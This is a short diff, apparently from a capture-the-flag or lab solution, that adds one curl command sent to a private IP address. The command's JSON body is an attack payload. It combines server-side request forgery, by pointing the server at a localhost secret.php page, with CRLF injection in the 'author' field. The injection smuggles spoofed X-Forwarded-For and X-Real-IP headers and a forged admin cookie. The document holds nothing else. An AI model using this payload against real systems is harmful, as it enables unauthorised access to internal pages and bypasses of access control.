@@ -1,0 +1,3 @@
+curl -X POST "http://192.168.10.24/" \
+-H "Content-Type: application/json" \
+--data '{"url": "http://127.0.0.1/secret.php","author": "admin\r\nX-Forwarded-For:127.0.0.1\r\nX-Real-IP:127.0.0.1\r\nCookie: admin=dHJ1ZQ\r\n"}'
